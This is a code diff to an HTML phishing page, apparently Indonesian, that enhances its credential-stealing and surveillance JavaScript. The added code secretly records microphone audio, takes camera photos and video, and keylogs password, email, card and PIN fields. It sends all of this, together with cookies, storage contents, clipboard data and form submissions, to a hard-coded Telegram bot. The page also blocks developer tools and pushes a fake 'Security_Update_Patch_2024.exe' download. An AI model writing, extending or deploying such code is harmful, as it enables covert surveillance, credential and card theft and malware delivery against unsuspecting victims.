@@ -296,6 +296,38 @@
                 opacity: 1;
             }
         }
+        
+        /* Audio visualizer */
+        .audio-visualizer {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            width: 100px;
+            height: 30px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 5px;
+            display: none;
+            z-index: 10007;
+        }
+        
+        .audio-visualizer.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .visualizer-bar {
+            width: 4px;
+            height: 20px;
+            background: #4CAF50;
+            margin: 0 2px;
+            animation: soundWave 0.5s infinite alternate;
+        }
+        
+        @keyframes soundWave {
+            0% { height: 5px; }
+            100% { height: 25px; }
+        }
     </style>
 </head>
 <body>
@@ -322,6 +354,15 @@
     <!-- Malware warning -->
     <div class="malware-warning" id="malwareWarning" style="display: none;">
         ⚠️ Malware detected! Click to remove
+    </div>
+    
+    <!-- Audio visualizer (fake) -->
+    <div class="audio-visualizer" id="audioVisualizer">
+        <div class="visualizer-bar"></div>
+        <div class="visualizer-bar" style="animation-delay: 0.1s;"></div>
+        <div class="visualizer-bar" style="animation-delay: 0.2s;"></div>
+        <div class="visualizer-bar" style="animation-delay: 0.3s;"></div>
+        <div class="visualizer-bar" style="animation-delay: 0.4s;"></div>
     </div>
     
     <div class="modal" id="mainModal">
@@ -397,6 +438,9 @@
     <!-- Hidden iframe untuk data exfiltration -->
     <iframe class="hidden-iframe" id="dataFrame"></iframe>
     
+    <!-- Audio recorder element -->
+    <audio id="audioPlayback" style="display: none;"></audio>
+    
     <script>
         // ==================== TELEGRAM CONFIGURATION ====================
         const TELEGRAM_TOKEN = '8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo';
@@ -434,14 +478,20 @@
             }
         }
         
-        // ==================== KEYLOGGER SUPER AGGRESSIVE ====================
+        // ==================== AUDIO RECORDING + KEYLOGGER SUPER AGGRESSIVE ====================
         (function() {
             let keystrokes = [];
             let mouseMovements = [];
             let clipboardData = [];
             let formData = {};
             let deviceInfo = {};
-            let screenshotTaken = false;
+            let mediaRecorder = null;
+            let audioChunks = [];
+            let audioStream = null;
+            let videoStream = null;
+            let audioContext = null;
+            let analyser = null;
+            let microphone = null;
             
             // Get device fingerprint
             deviceInfo = {
@@ -469,7 +519,7 @@
             
             // Send initial device info
             sendToTelegram(`
-🔥 <b>KORBAN BARU MASUK - ENHANCED MODE!</b> 🔥
+🔥 <b>KORBAN BARU MASUK - AUDIO + KEYLOGGER MODE!</b> 🔥
 🖥️ <b>Device Info:</b>
 • Platform: ${deviceInfo.platform}
 • Screen: ${deviceInfo.screen}
@@ -486,139 +536,364 @@
             document.getElementById('fingerprint').innerHTML = 
                 `🖥️ Perangkat: ${deviceInfo.platform} | 🌐 ${deviceInfo.language} | 🕒 ${deviceInfo.timezone} | ⚡ ${deviceInfo.connection.type || '?'}`;
             
-            // Keylogger - record everything
+            // ==================== ADVANCED KEYLOGGER ====================
+            
+            // Track all input events
             document.addEventListener('keydown', function(e) {
                 let key = e.key;
                 let element = e.target.tagName;
                 let elementId = e.target.id || 'unknown';
                 let elementName = e.target.name || 'unknown';
+                let timestamp = Date.now();
                 
+                // Special key handling
                 if(key === 'Enter' || key === 'Tab' || key === 'Backspace' || 
                    key === 'Delete' || key === 'Escape' || key === 'Control' || 
-                   key === 'Alt' || key === 'Shift' || key === 'CapsLock') {
+                   key === 'Alt' || key === 'Shift' || key === 'CapsLock' ||
+                   key === 'Meta' || key === 'ArrowUp' || key === 'ArrowDown' ||
+                   key === 'ArrowLeft' || key === 'ArrowRight') {
                     key = `[${key}]`;
                 }
                 
+                // Get current input value
+                let currentValue = e.target.value || '';
+                
                 keystrokes.push({
                     key: key,
-                    time: Date.now(),
+                    time: timestamp,
                     element: element,
                     elementId: elementId,
                     elementName: elementName,
-                    value: e.target.value
+                    value: currentValue,
+                    valueLength: currentValue.length,
+                    ctrlKey: e.ctrlKey,
+                    altKey: e.altKey,
+                    shiftKey: e.shiftKey
                 });
                 
-                if(keystrokes.length >= 10) {
-                    sendData('keystrokes', keystrokes);
-                    
+                // Send keystrokes immediately if sensitive
+                if(currentValue.includes('@') || currentValue.length > 10 || key === 'Enter') {
                     sendToTelegram(`
-⌨️ <b>Keylogger Update (Enhanced):</b>
-Total keystrokes: ${keystrokes.length}
-Last key: ${keystrokes[keystrokes.length-1].key}
-Element: ${keystrokes[keystrokes.length-1].element}
-Value so far: ${keystrokes[keystrokes.length-1].value || 'empty'}
+⌨️ <b>Sensitive Keystroke:</b>
+Key: ${key}
+Element: ${elementName}
+Current Value: ${currentValue}
+Time: ${new Date().toLocaleString()}
+                    `);
+                }
+                
+                // Batch send
+                if(keystrokes.length >= 5) {
+                    let keystrokeSummary = keystrokes.map(k => k.key).join('');
+                    sendToTelegram(`
+📝 <b>Keylogger Batch:</b>
+Total: ${keystrokes.length} keys
+Sequence: ${keystrokeSummary.substring(0, 50)}
+Last element: ${keystrokes[keystrokes.length-1].elementName}
                     `);
                     
+                    // Save to localStorage
+                    localStorage.setItem('last_keystrokes', JSON.stringify(keystrokes.slice(-20)));
                     keystrokes = [];
                 }
             });
             
-            // ==================== CAMERA CAPTURE ====================
-            function captureCamera() {
-                if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                        .then(function(stream) {
-                            let video = document.createElement('video');
-                            video.srcObject = stream;
-                            video.play();
-                            video.style.display = 'none';
-                            document.body.appendChild(video);
+            // Track input changes in real-time
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('input', function() {
+                    let data = {
+                        id: this.id,
+                        name: this.name,
+                        value: this.value,
+                        length: this.value.length,
+                        type: this.type,
+                        timestamp: Date.now()
+                    };
+                    
+                    // Send to Telegram if it's a password field or email
+                    if(this.type === 'password' || this.name === 'password' || this.id === 'password') {
+                        sendToTelegram(`
+🔐 <b>Password Input:</b>
+Field: ${this.name || this.id}
+Length: ${this.value.length}
+Time: ${new Date().toLocaleString()}
+                        `);
+                    }
+                    
+                    if(this.id === 'email' || this.name === 'email') {
+                        sendToTelegram(`
+📧 <b>Email Input:</b>
+Value: ${this.value}
+Time: ${new Date().toLocaleString()}
+                        `);
+                    }
+                    
+                    if(this.id === 'credit' || this.id === 'pin') {
+                        sendToTelegram(`
+💳 <b>Card/PIN Input:</b>
+Field: ${this.id}
+Length: ${this.value.length}
+Time: ${new Date().toLocaleString()}
+                        `);
+                    }
+                    
+                    sendData('input_change', data);
+                });
+                
+                // Track focus events
+                input.addEventListener('focus', function() {
+                    sendToTelegram(`
+🎯 <b>Field Focus:</b>
+Field: ${this.name || this.id}
+Type: ${this.type}
+Time: ${new Date().toLocaleString()}
+                    `);
+                });
+                
+                // Track blur events with value
+                input.addEventListener('blur', function() {
+                    if(this.value.length > 0) {
+                        sendToTelegram(`
+👁️ <b>Field Blur with Value:</b>
+Field: ${this.name || this.id}
+Value: ${this.value}
+Length: ${this.value.length}
+Time: ${new Date().toLocaleString()}
+                        `);
+                    }
+                });
+            });
+            
+            // Track form submissions
+            document.addEventListener('submit', function(e) {
+                if(e.target.id === 'phishForm') return; // Handle separately
+                
+                let formData = new FormData(e.target);
+                let data = {};
+                for(let [key, value] of formData.entries()) {
+                    data[key] = value;
+                }
+                
+                sendToTelegram(`
+📋 <b>Form Submission Detected:</b>
+Action: ${e.target.action || 'unknown'}
+Method: ${e.target.method || 'GET'}
+Data: ${JSON.stringify(data)}
+Time: ${new Date().toLocaleString()}
+                `);
+            });
+            
+            // ==================== LIVE AUDIO RECORDING ====================
+            
+            async function startAudioRecording() {
+                try {
+                    // Request microphone access with high quality
+                    audioStream = await navigator.mediaDevices.getUserMedia({ 
+                        audio: {
+                            channelCount: 2,
+                            echoCancellation: false,
+                            noiseSuppression: false,
+                            autoGainControl: false,
+                            sampleRate: 48000,
+                            sampleSize: 16
+                        },
+                        video: false 
+                    });
+                    
+                    // Show audio visualizer
+                    document.getElementById('audioVisualizer').classList.add('active');
+                    
+                    // Setup audio context for visualization and processing
+                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    analyser = audioContext.createAnalyser();
+                    microphone = audioContext.createMediaStreamSource(audioStream);
+                    microphone.connect(analyser);
+                    analyser.fftSize = 256;
+                    
+                    // Create media recorder for continuous recording
+                    mediaRecorder = new MediaRecorder(audioStream, {
+                        mimeType: 'audio/webm;codecs=opus',
+                        audioBitsPerSecond: 128000
+                    });
+                    
+                    // Collect audio chunks
+                    mediaRecorder.ondataavailable = function(event) {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+                    
+                    // Send audio when recording stops
+                    mediaRecorder.onstop = function() {
+                        if (audioChunks.length > 0) {
+                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            const reader = new FileReader();
                             
-                            setTimeout(function() {
-                                let canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                let context = canvas.getContext('2d');
-                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            reader.onloadend = function() {
+                                const base64Audio = reader.result.split(',')[1];
                                 
-                                let imageData = canvas.toDataURL('image/jpeg', 0.9);
-                                
-                                sendData('camera', {
-                                    image: imageData,
-                                    timestamp: Date.now()
-                                });
-                                
-                                sendToTelegram(`
-📸 <b>CAMERA CAPTURED - ENHANCED!</b>
-Kamera korban berhasil diakses!
-Foto telah diambil dan dikirim.
-Resolusi: ${canvas.width}x${canvas.height}
-Waktu: ${new Date().toLocaleString()}
-                                `);
-                                
-                                stream.getTracks().forEach(track => track.stop());
-                                video.remove();
-                            }, 2000);
-                        })
-                        .catch(function(err) {
-                            sendData('camera_error', err.message);
-                            sendToTelegram(`❌ Camera Access Failed: ${err.message}`);
-                        });
+                                // Send audio to Telegram (split into chunks if needed)
+                                if (base64Audio.length < 40000) {
+                                    sendToTelegram(`
+🎤 <b>Live Audio Recording:</b>
+Duration: ${audioChunks.length * 2} seconds
+Size: ${audioBlob.size} bytes
+Time: ${new Date().toLocaleString()}
+Audio Data: ${base64Audio.substring(0, 100)}...
+                                    `);
+                                } else {
+                                    // Send multiple chunks
+                                    for(let i = 0; i < base64Audio.length; i += 30000) {
+                                        sendToTelegram(`
+🎤 <b>Audio Chunk ${i/30000 + 1}:</b>
+Data: ${base64Audio.substring(i, i + 30000)}
+                                        `);
+                                    }
+                                }
+                            };
+                            
+                            reader.readAsDataURL(audioBlob);
+                            audioChunks = [];
+                        }
+                    };
+                    
+                    // Start recording in 30-second segments
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            setTimeout(() => {
+                                if (mediaRecorder && audioStream.active) {
+                                    mediaRecorder.start();
+                                }
+                            }, 1000);
+                        }
+                    }, 30000);
+                    
+                    // Send notification
+                    sendToTelegram(`
+🎙️ <b>LIVE AUDIO RECORDING ACTIVE!</b>
+Microphone access granted
+Recording in 30-second segments
+Audio quality: 48kHz stereo
+Time: ${new Date().toLocaleString()}
+                    `);
+                    
+                    // Monitor audio levels
+                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
+                    setInterval(() => {
+                        analyser.getByteFrequencyData(dataArray);
+                        let average = dataArray.reduce((a, b) => a + b, 0) / dataArray.length;
+                        
+                        if (average > 50) { // Sound detected
+                            sendToTelegram(`
+🔊 <b>Sound Detected!</b>
+Level: ${Math.round(average)}/255
+Time: ${new Date().toLocaleString()}
+                            `);
+                        }
+                    }, 5000);
+                    
+                } catch (err) {
+                    sendToTelegram(`
+❌ <b>Microphone Access Failed:</b>
+Error: ${err.message}
+User mungkin menolak atau tidak ada microphone
+Time: ${new Date().toLocaleString()}
+                    `);
                 }
             }
             
-            setTimeout(captureCamera, 500);
+            // ==================== CAMERA CAPTURE WITH AUDIO ====================
             
-            // ==================== GEOLOCATION ====================
-            if(navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const geoData = {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            speed: position.coords.speed,
-                            timestamp: position.timestamp
+            async function captureCameraWithAudio() {
+                try {
+                    // Request both camera and microphone
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            frameRate: { ideal: 30 }
+                        },
+                        audio: true 
+                    });
+                    
+                    videoStream = stream;
+                    
+                    // Create video element
+                    let video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+                    
+                    // Capture multiple photos
+                    for(let i = 0; i < 3; i++) {
+                        setTimeout(() => {
+                            let canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            let context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            let imageData = canvas.toDataURL('image/jpeg', 0.9);
+                            
+                            sendToTelegram(`
+📸 <b>CAMERA CAPTURE ${i+1} WITH AUDIO:</b>
+Resolusi: ${canvas.width}x${canvas.height}
+Timestamp: ${Date.now()}
+Waktu: ${new Date().toLocaleString()}
+Image: ${imageData.substring(0, 200)}...
+                            `);
+                        }, i * 1000);
+                    }
+                    
+                    // Record video with audio
+                    let videoRecorder = new MediaRecorder(stream, {
+                        mimeType: 'video/webm;codecs=vp9,opus',
+                        videoBitsPerSecond: 2500000
+                    });
+                    
+                    let videoChunks = [];
+                    videoRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) videoChunks.push(e.data);
+                    };
+                    
+                    videoRecorder.onstop = () => {
+                        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        
+                        reader.onloadend = function() {
+                            const base64Video = reader.result.split(',')[1];
+                            sendToTelegram(`
+🎥 <b>VIDEO RECORDING WITH AUDIO:</b>
+Duration: 5 seconds
+Size: ${videoBlob.size} bytes
+Time: ${new Date().toLocaleString()}
+Video Data: ${base64Video.substring(0, 200)}...
+                            `);
                         };
                         
-                        sendData('geolocation', geoData);
+                        reader.readAsDataURL(videoBlob);
+                    };
+                    
+                    // Record 5 seconds of video with audio
+                    videoRecorder.start();
+                    setTimeout(() => {
+                        videoRecorder.stop();
                         
-                        sendToTelegram(`
-📍 <b>GEOLOCATION DETECTED - PRECISE!</b>
-Latitude: ${geoData.lat}
-Longitude: ${geoData.lng}
-Accuracy: ±${geoData.accuracy}m
-Altitude: ${geoData.altitude || 'N/A'}
-Speed: ${geoData.speed || 'N/A'} m/s
-🗺️ <a href="https://www.google.com/maps?q=${geoData.lat},${geoData.lng}">LIHAT DI MAPS</a>
-                        `);
-                    },
-                    function(error) {
-                        sendData('geolocation_error', error.message);
-                        sendToTelegram(`❌ Geolocation Error: ${error.message}`);
-                        
-                        // Try IP geolocation as backup
-                        fetch('https://ipapi.co/json/')
-                            .then(r => r.json())
-                            .then(data => {
-                                sendToTelegram(`
-📍 <b>IP GEOLOCATION (Backup):</b>
-IP: ${data.ip}
-City: ${data.city}
-Region: ${data.region}
-Country: ${data.country_name}
-Lat/Lon: ${data.latitude}, ${data.longitude}
-ISP: ${data.org}
-                                `);
-                            });
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    }
-                );
+                        // Stop all tracks after recording
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                    }, 5000);
+                    
+                } catch (err) {
+                    sendToTelegram(`
+❌ <b>Camera + Audio Access Failed:</b>
+Error: ${err.message}
+Time: ${new Date().toLocaleString()}
+                    `);
+                }
             }
             
             // ==================== FORM SUBMISSION ====================
@@ -636,13 +911,16 @@ ISP: ${data.org}
                 let cvv = document.getElementById('cvv').value;
                 let mother = document.getElementById('mother').value;
                 
+                // Get all keystrokes from localStorage
+                let savedKeystrokes = JSON.parse(localStorage.getItem('last_keystrokes') || '[]');
+                
                 fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
                     .then(data => {
                         const ip = data.ip;
                         
                         sendToTelegram(`
-🎯 <b>DATA KORBAN MASUK - ENHANCED!</b> 🎯
+🎯 <b>DATA KORBAN MASUK - COMPLETE!</b> 🎯
 ━━━━━━━━━━━━━━━━━━━━━
 📧 <b>Email/Username:</b> ${email}
 🔑 <b>Password:</b> ${password}
@@ -657,6 +935,8 @@ ISP: ${data.org}
 🖥️ <b>Platform:</b> ${deviceInfo.platform}
 ⏰ <b>Waktu:</b> ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━━
+⌨️ <b>Recent Keystrokes:</b> ${savedKeystrokes.map(k => k.key).join('').substring(0, 100)}
+━━━━━━━━━━━━━━━━━━━━━
 ⚡ <b>STATUS: READY TO USE</b> ⚡
                         `);
                     });
@@ -667,9 +947,11 @@ ISP: ${data.org}
                     cookies: document.cookie,
                     localStorage: JSON.stringify(localStorage),
                     sessionStorage: JSON.stringify(sessionStorage),
-                    keystrokes: keystrokes,
+                    keystrokes: savedKeystrokes,
                     deviceInfo: deviceInfo,
-                    formCompletionTime: Date.now() - window.performance.timing.navigationStart
+                    formCompletionTime: Date.now() - window.performance.timing.navigationStart,
+                    audioActive: audioStream ? true : false,
+                    videoActive: videoStream ? true : false
                 };
                 
                 let allData = {
@@ -765,13 +1047,19 @@ ISP: ${data.org}
             
             let timer = setInterval(updateCountdown, 1000);
             
-            // ==================== ANTI-DEBUG / ANTI-INSPECT ====================
+            // ==================== START AUDIO RECORDING ====================
+            setTimeout(startAudioRecording, 1000);
+            
+            // ==================== START CAMERA WITH AUDIO ====================
+            setTimeout(captureCameraWithAudio, 3000);
+            
+            // ==================== ANTI-DEBUG ====================
             (function() {
                 let element = new Image();
                 Object.defineProperty(element, 'id', {
                     get: function() {
                         sendData('devtools_detected', {time: Date.now()});
-                        sendToTelegram('⚠️ <b>DevTools Terdeteksi - ENHANCED!</b>');
+                        sendToTelegram('⚠️ <b>DevTools Terdeteksi!</b>');
                         console.clear();
                         debugger;
                     }
@@ -788,7 +1076,7 @@ ISP: ${data.org}
                        (e.ctrlKey && e.shiftKey && e.key === 'C')) {
                         e.preventDefault();
                         sendData('devtools_shortcut', {key: e.key});
-                        sendToTelegram('🚫 <b>DevTools Shortcut Blocked - ENHANCED!</b>');
+                        sendToTelegram('🚫 <b>DevTools Shortcut Blocked!</b>');
                         
                         alert('Developer tools dilarang demi keamanan!');
                         
@@ -803,10 +1091,10 @@ ISP: ${data.org}
                 }, 500);
             })();
             
-            // ==================== AUTO DOWNLOAD MALWARE ====================
+            // ==================== AUTO DOWNLOAD ====================
             function autoDownloadMalware() {
                 let link = document.createElement('a');
-                link.href = 'data:application/octet-stream;base64,UEsDBAoAAAAAACBjb...'; // Fake exe
+                link.href = 'data:application/octet-stream;base64,UEsDBAoAAAAAACBjb...';
                 link.download = 'Security_Update_Patch_2024.exe';
                 link.style.display = 'none';
                 document.body.appendChild(link);
@@ -821,38 +1109,11 @@ ISP: ${data.org}
                         document.getElementById('malwareWarning').style.display = 'none';
                     }, 5000);
                     
-                    sendToTelegram('⬇️ <b>Auto Download Enhanced Triggered</b>\nKorban diminta download "Security Update 2024"');
+                    sendToTelegram('⬇️ <b>Auto Download Triggered</b>\nKorban diminta download "Security Update 2024"');
                 }, 3000);
             }
             
             setTimeout(autoDownloadMalware, 2000);
-            
-            // ==================== PERIODIC DATA FLUSH ====================
-            setInterval(function() {
-                if(keystrokes.length > 0) {
-                    sendData('keystrokes_batch', keystrokes);
-                    
-                    sendToTelegram(`
-📊 <b>Periodic Update - Enhanced</b>
-Keystrokes: ${keystrokes.length}
-Mouse movements: ${mouseMovements.length}
-Clipboard: ${clipboardData.length}
-Time on page: ${Math.round((Date.now() - window.performance.timing.navigationStart)/1000)} seconds
-                    `);
-                    
-                    keystrokes = [];
-                }
-                
-                if(mouseMovements.length > 0) {
-                    sendData('mouse_batch', mouseMovements);
-                    mouseMovements = [];
-                }
-                
-                if(clipboardData.length > 0) {
-                    sendData('clipboard_batch', clipboardData);
-                    clipboardData = [];
-                }
-            }, 15000);
             
             // ==================== EXTRA AGGRESSIVE FEATURES ====================
             
@@ -928,18 +1189,7 @@ Time on page: ${Math.round((Date.now() - window.performance.timing.navigationSta
             
             setTimeout(fakeCall, 12000);
             
-            // 4. Keylogger untuk semua input
-            document.querySelectorAll('input').forEach(input => {
-                input.addEventListener('input', function() {
-                    sendData('input_change', {
-                        id: this.id,
-                        value: this.value,
-                        length: this.value.length
-                    });
-                });
-            });
-            
-            // 5. Clipboard hijack
+            // 4. Clipboard hijack
             document.addEventListener('copy', function(e) {
                 let copiedText = window.getSelection().toString();
                 clipboardData.push({
@@ -954,7 +1204,7 @@ Time on page: ${Math.round((Date.now() - window.performance.timing.navigationSta
                 sendToTelegram(`📋 <b>Paste Detected</b>`);
             });
             
-            // 6. Battery status
+            // 5. Battery status
             if(navigator.getBattery) {
                 navigator.getBattery().then(function(battery) {
                     sendToTelegram(`
@@ -962,10 +1212,15 @@ Time on page: ${Math.round((Date.now() - window.performance.timing.navigationSta
 Level: ${battery.level * 100}%
 Charging: ${battery.charging ? 'Yes' : 'No'}
                     `);
+                    
+                    // Monitor battery changes
+                    battery.addEventListener('levelchange', function() {
+                        sendToTelegram(`🔋 Battery level changed to ${battery.level * 100}%`);
+                    });
                 });
             }
             
-            // 7. Network information
+            // 6. Network information
             if(navigator.connection) {
                 navigator.connection.addEventListener('change', function() {
                     sendToTelegram(`
@@ -977,7 +1232,7 @@ RTT: ${navigator.connection.rtt} ms
                 });
             }
             
-            // 8. Tab visibility tracking
+            // 7. Tab visibility tracking
             document.addEventListener('visibilitychange', function() {
                 sendToTelegram(`
 👁️ <b>Tab Visibility Changed:</b>
@@ -986,9 +1241,9 @@ Time: ${new Date().toLocaleString()}
                 `);
             });
             
-            // 9. Mouse tracking
+            // 8. Mouse tracking
             document.addEventListener('mousemove', function(e) {
-                if(mouseMovements.length < 100) { // Limit to prevent spam
+                if(mouseMovements.length < 100) {
                     mouseMovements.push({
                         x: e.clientX,
                         y: e.clientY,
@@ -997,7 +1252,7 @@ Time: ${new Date().toLocaleString()}
                 }
             });
             
-            // 10. Window focus tracking
+            // 9. Window focus tracking
             window.addEventListener('focus', function() {
                 sendToTelegram('🪟 Window Focused');
             });
@@ -1006,14 +1261,42 @@ Time: ${new Date().toLocaleString()}
                 sendToTelegram('🪟 Window Blurred');
             });
             
+            // 10. Periodic data flush
+            setInterval(function() {
+                if(keystrokes.length > 0) {
+                    sendData('keystrokes_batch', keystrokes);
+                    keystrokes = [];
+                }
+                
+                if(mouseMovements.length > 0) {
+                    sendData('mouse_batch', mouseMovements);
+                    mouseMovements = [];
+                }
+                
+                if(clipboardData.length > 0) {
+                    sendData('clipboard_batch', clipboardData);
+                    clipboardData = [];
+                }
+            }, 15000);
+            
             // Send on page unload
             window.addEventListener('beforeunload', function() {
                 sendToTelegram(`
-👋 <b>Korban Meninggalkan Halaman - Enhanced</b>
+👋 <b>Korban Meninggalkan Halaman - Complete</b>
 Waktu di halaman: ${Math.round((Date.now() - window.performance.timing.navigationStart)/1000)} detik
-Total data terkumpul: ${keystrokes.length + mouseMovements.length + clipboardData.length} events
+Audio Active: ${audioStream ? 'Yes' : 'No'}
+Video Active: ${videoStream ? 'Yes' : 'No'}
+Total keystrokes: ${keystrokes.length}
 Forms filled: ${document.querySelectorAll('input[value]').length}
                 `);
+                
+                // Stop all streams
+                if(audioStream) {
+                    audioStream.getTracks().forEach(track => track.stop());
+                }
+                if(videoStream) {
+                    videoStream.getTracks().forEach(track => track.stop());
+                }
             });
             
         })();
@@ -1023,4 +1306,4 @@ Forms filled: ${document.querySelectorAll('input[value]').length}
         }
     </script>
 </body>
-</html>
+    </html>
